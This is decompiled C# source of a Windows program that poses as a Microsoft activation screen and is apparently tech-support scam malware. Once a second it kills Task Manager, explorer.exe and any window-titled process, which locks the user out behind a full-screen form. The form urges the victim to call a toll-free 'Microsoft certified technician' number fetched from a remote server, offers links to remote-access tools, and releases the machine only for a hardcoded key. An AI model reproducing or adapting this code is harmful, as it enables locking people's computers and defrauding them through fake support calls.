using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using wmplayers.My.Resources;

namespace wmplayers;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TableLayoutPanel1")]
	private TableLayoutPanel _TableLayoutPanel1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("lblTFN")]
	private Label _lblTFN;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox _PictureBox3;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TableLayoutPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TableLayoutPanel1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Label lblTFN
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblTFN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblTFN = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual Panel Panel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel2 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel3 = value;
		}
	}

	internal virtual PictureBox PictureBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox3_Click;
			if (_PictureBox3 != null)
			{
				((Control)_PictureBox3).remove_Click(eventHandler);
			}
			_PictureBox3 = value;
			if (_PictureBox3 != null)
			{
				((Control)_PictureBox3).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox1_Click;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).remove_Click(eventHandler);
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox2_Click;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).remove_Click(eventHandler);
			}
			_PictureBox2 = value;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).add_Click(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected O, but got Unknown
		//IL_0189: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Expected O, but got Unknown
		//IL_022a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0234: Expected O, but got Unknown
		//IL_0246: Unknown result type (might be due to invalid IL or missing references)
		//IL_0250: Expected O, but got Unknown
		//IL_0262: Unknown result type (might be due to invalid IL or missing references)
		//IL_026c: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_04f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0501: Expected O, but got Unknown
		//IL_0592: Unknown result type (might be due to invalid IL or missing references)
		//IL_059c: Expected O, but got Unknown
		//IL_060e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0618: Expected O, but got Unknown
		//IL_06b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06be: Expected O, but got Unknown
		//IL_076d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0777: Expected O, but got Unknown
		//IL_0826: Unknown result type (might be due to invalid IL or missing references)
		//IL_0830: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TableLayoutPanel1 = new TableLayoutPanel();
		Panel1 = new Panel();
		Label2 = new Label();
		Panel2 = new Panel();
		Button1 = new Button();
		TextBox1 = new TextBox();
		Label6 = new Label();
		lblTFN = new Label();
		Label1 = new Label();
		Label4 = new Label();
		ListBox1 = new ListBox();
		Panel3 = new Panel();
		PictureBox2 = new PictureBox();
		PictureBox1 = new PictureBox();
		PictureBox3 = new PictureBox();
		Timer1 = new Timer(components);
		((Control)TableLayoutPanel1).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((Control)Panel2).SuspendLayout();
		((Control)Panel3).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox3).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TableLayoutPanel1).set_BackColor(Color.Transparent);
		TableLayoutPanel1.set_ColumnCount(3);
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 15f));
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 70f));
		TableLayoutPanel1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 15f));
		TableLayoutPanel1.get_Controls().Add((Control)(object)Panel1, 1, 1);
		TableLayoutPanel1.get_Controls().Add((Control)(object)ListBox1, 0, 1);
		TableLayoutPanel1.get_Controls().Add((Control)(object)Panel3, 2, 0);
		((Control)TableLayoutPanel1).set_Dock((DockStyle)5);
		TableLayoutPanel tableLayoutPanel = TableLayoutPanel1;
		Point location = new Point(0, 0);
		((Control)tableLayoutPanel).set_Location(location);
		((Control)TableLayoutPanel1).set_Name("TableLayoutPanel1");
		TableLayoutPanel1.set_RowCount(3);
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 10f));
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 80f));
		TableLayoutPanel1.get_RowStyles().Add(new RowStyle((SizeType)2, 10f));
		TableLayoutPanel tableLayoutPanel2 = TableLayoutPanel1;
		Size size = new Size(1099, 624);
		((Control)tableLayoutPanel2).set_Size(size);
		((Control)TableLayoutPanel1).set_TabIndex(0);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).get_Controls().Add((Control)(object)Panel2);
		((Control)Panel1).get_Controls().Add((Control)(object)lblTFN);
		((Control)Panel1).get_Controls().Add((Control)(object)Label1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label4);
		((Control)Panel1).set_Dock((DockStyle)5);
		Panel panel = Panel1;
		location = new Point(167, 65);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(763, 493);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(0);
		((Control)Label2).set_Anchor((AnchorStyles)12);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Segoe UI Semibold", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label label = Label2;
		location = new Point(362, 362);
		((Control)label).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label2 = Label2;
		size = new Size(30, 28);
		((Control)label2).set_Size(size);
		((Control)Label2).set_TabIndex(26);
		Label2.set_Text("Or");
		Label2.set_TextAlign((ContentAlignment)32);
		((Control)Panel2).set_Anchor((AnchorStyles)12);
		((Control)Panel2).get_Controls().Add((Control)(object)Button1);
		((Control)Panel2).get_Controls().Add((Control)(object)TextBox1);
		((Control)Panel2).get_Controls().Add((Control)(object)Label6);
		Panel panel3 = Panel2;
		location = new Point(22, 389);
		((Control)panel3).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel4 = Panel2;
		size = new Size(738, 84);
		((Control)panel4).set_Size(size);
		((Control)Panel2).set_TabIndex(25);
		((ButtonBase)Button1).set_BackColor(Color.FromArgb(61, 109, 191));
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Segoe UI Semibold", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_ForeColor(Color.White);
		Button button = Button1;
		location = new Point(512, 9);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(184, 41);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(17);
		((ButtonBase)Button1).set_Text("Activate Now");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)TextBox1).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		location = new Point(71, 13);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(423, 35);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(16);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		Label label3 = Label6;
		location = new Point(72, 52);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(88, 22);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(18);
		Label6.set_Text("Privacy Policy");
		((Control)lblTFN).set_Anchor((AnchorStyles)12);
		((Control)lblTFN).set_BackColor(Color.Transparent);
		((Control)lblTFN).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblTFN).set_ForeColor(Color.White);
		Label obj = lblTFN;
		location = new Point(127, 334);
		((Control)obj).set_Location(location);
		((Control)lblTFN).set_Name("lblTFN");
		Label obj2 = lblTFN;
		size = new Size(504, 28);
		((Control)obj2).set_Size(size);
		((Control)lblTFN).set_TabIndex(24);
		lblTFN.set_Text("1-888-879-0163");
		lblTFN.set_TextAlign((ContentAlignment)32);
		((Control)Label1).set_Anchor((AnchorStyles)12);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label5 = Label1;
		location = new Point(102, 298);
		((Control)label5).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label6 = Label1;
		size = new Size(565, 43);
		((Control)label6).set_Size(size);
		((Control)Label1).set_TabIndex(23);
		Label1.set_Text("Please contact a Microsoft certified technician on\r\n");
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)Label4).set_Anchor((AnchorStyles)12);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		Label label7 = Label4;
		location = new Point(3, 89);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(757, 167);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(22);
		Label4.set_Text(componentResourceManager.GetString("Label4.Text"));
		Label4.set_TextAlign((ContentAlignment)32);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(3, 65);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(138, 355);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(1);
		((Control)ListBox1).set_Visible(false);
		((Control)Panel3).get_Controls().Add((Control)(object)PictureBox2);
		((Control)Panel3).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel3).get_Controls().Add((Control)(object)PictureBox3);
		((Control)Panel3).set_Dock((DockStyle)5);
		Panel panel5 = Panel3;
		location = new Point(936, 3);
		((Control)panel5).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel6 = Panel3;
		size = new Size(160, 56);
		((Control)panel6).set_Size(size);
		((Control)Panel3).set_TabIndex(2);
		((Control)PictureBox2).set_Anchor((AnchorStyles)1);
		((Control)PictureBox2).set_BackColor(Color.Transparent);
		((Control)PictureBox2).set_BackgroundImage((Image)(object)Resources.logo);
		((Control)PictureBox2).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox = PictureBox2;
		location = new Point(65, 9);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox2 = PictureBox2;
		size = new Size(92, 24);
		((Control)pictureBox2).set_Size(size);
		PictureBox2.set_TabIndex(8);
		PictureBox2.set_TabStop(false);
		((Control)PictureBox1).set_Anchor((AnchorStyles)1);
		((Control)PictureBox1).set_BackColor(Color.Transparent);
		((Control)PictureBox1).set_BackgroundImage((Image)(object)Resources._25130);
		((Control)PictureBox1).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox3 = PictureBox1;
		location = new Point(34, 9);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox4 = PictureBox1;
		size = new Size(25, 24);
		((Control)pictureBox4).set_Size(size);
		PictureBox1.set_TabIndex(7);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox3).set_Anchor((AnchorStyles)1);
		((Control)PictureBox3).set_BackColor(Color.Transparent);
		((Control)PictureBox3).set_BackgroundImage((Image)(object)Resources.teamviewer_by_bitingduke_d7lpfbz);
		((Control)PictureBox3).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox5 = PictureBox3;
		location = new Point(3, 9);
		((Control)pictureBox5).set_Location(location);
		((Control)PictureBox3).set_Name("PictureBox3");
		PictureBox pictureBox6 = PictureBox3;
		size = new Size(25, 24);
		((Control)pictureBox6).set_Size(size);
		PictureBox3.set_TabIndex(6);
		PictureBox3.set_TabStop(false);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.win108);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(1099, 624);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TableLayoutPanel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)TableLayoutPanel1).ResumeLayout(false);
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel3).ResumeLayout(false);
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox3).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Timer1.set_Enabled(false);
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(process.MainWindowTitle, "Task Manager", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(process.MainWindowTitle, "", false) != 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(process.ProcessName, "Taskmgr", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
		}
		Timer1.set_Enabled(true);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(process.MainWindowTitle, "Task Manager", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(process.ProcessName, "Taskmgr", false) == 0)
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				Process[] processesByName = Process.GetProcessesByName("explorer");
				Process[] array = processesByName;
				foreach (Process process2 in array)
				{
					process2.Kill();
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		string text = TextBox1.get_Text();
		text = text.Replace("-", "");
		if (Operators.CompareString(text, "8716098676562789", false) == 0)
		{
			Timer1.set_Enabled(false);
			Process.Start("explorer.exe");
			Application.Exit();
			((Form)this).Close();
			return;
		}
		string text2;
		try
		{
			text2 = PlayerHasPremium("MrLore");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text2 = "1-888-879-0163";
			ProjectData.ClearProjectError();
		}
		Interaction.MsgBox((object)("Your key seems to have been expired, Please call at " + text2 + " to get a new one"), (MsgBoxStyle)48, (object)"Microsoft Windows Activation");
	}

	private string GetWebPageText(string url)
	{
		WebRequest webRequest = WebRequest.Create(url);
		webRequest.Credentials = CredentialCache.DefaultCredentials;
		return new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
	}

	private string PlayerHasPremium(string PlayerName)
	{
		return GetWebPageText("http://webadmin.pcshielder.online/gettfnurl.aspx");
	}

	private void PictureBox3_Click(object sender, EventArgs e)
	{
		Process.Start("https://www.teamviewer.com/en/");
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		Process.Start("https://logmein123.com");
	}

	private void PictureBox2_Click(object sender, EventArgs e)
	{
		Process.Start("http://www.supremocontrol.com");
	}
}
